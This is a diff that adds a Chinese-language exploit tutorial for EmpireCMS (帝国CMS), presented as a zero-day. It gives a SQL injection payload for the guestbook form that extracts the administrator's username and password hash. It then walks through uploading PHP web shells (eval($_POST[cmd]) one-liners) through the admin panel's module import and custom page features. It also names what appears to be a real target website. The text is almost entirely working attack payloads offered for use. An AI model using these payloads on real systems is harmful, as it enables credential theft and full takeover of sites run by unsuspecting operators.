@@ -1,0 +1,34 @@
+帝国CMS网站程序0DAY：找到使用帝国CMS的站,网址后面直接加：
+
+e/tool/gbook/?bid=1
+
+出来的是帝国CMS的留言本,在姓名处写：
+
+縗\
+
+联系邮箱处写：
+
+,1,1,1,(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where userid=1),1,1,1,0,0,0)/*
+
+提交后爆出账号密码
+
+e/admin
+
+
+
+www.yzdfyy.com
+
+，（进入后台---系统设置---管理数据表---管理系统模型---导入新型模块,直接把修改过的php的shell改名为shell.php.mod上传，新版使用uploadm~num.php来递增数字）发现6.6不行，上传之后会变成类似uploadm1324885505nXmTdQamQq.php这样的！
+
+
+漏洞证明：换了个办法其实也很简单<?fputs(fopen("cao.php","w"),"<?eval(\$_POST[cmd]);?>")?> 保存为1.php.mod 然后还是进入后台---系统设置---管理数据表---管理系统模型---导入新型模块，上传之后马儿就躺在了/e/admin/cao.php了
+
+
+
+
+
+。进入后台-> 模板管理->自定义页面->增加自定义页面。页面名称随便填，文件名也得取一个，文件名处可以填指定路径，分类不必理会，页面内容处写入如下 代码：
+
+<\?php eval($_POST[cmd]);?\>
+
+一般的PHP一句话马的代码是<? php eval($_POST[cmd]);?>，其中cmd是密码。但是这里一定要按上面要求的前后都要加上\，不加的话就不会成功，非常重要，务必记 住！然后点击提交，再返回到管理自定义页面，点击刚才起的页面名称，直接跳转至e/admin/template/hackest.php，无法找到该 页，路径不对嘛，当然找不到了，改成e/admin/hackest.php
